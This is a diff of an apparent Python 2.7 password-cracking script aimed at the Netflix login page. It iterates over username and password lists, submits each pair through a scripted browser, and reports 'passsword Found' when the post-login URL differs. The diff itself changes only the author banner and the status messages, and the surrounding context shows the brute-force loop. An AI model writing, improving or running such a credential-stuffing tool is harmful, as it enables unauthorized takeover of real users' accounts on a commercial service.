@@ -3,7 +3,11 @@ print("""
 
 		Programmer By MeXaW
 		@3typa - Twitter
-		@Team FOx 4 :)
+		For TMIM 506 Almrshdi Lord AL-GNOB #
+		1337r00t
+		
+		
+		2.7 python 
 
 	""")
 print("plz write username list and password list !")
@@ -49,7 +53,7 @@ for k in username1:
 		br.submit()
 		if br.geturl() != "https://www.netflix.com/sa-en/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse":
 
-			print("PAssword Found !",i,"Email >",k)
+			print("passsword Found !",i,"Email >",k)
 
 		else:
-			print("Faild",i,k)
+			print("Pass OR Email Wrong > ",i,k)
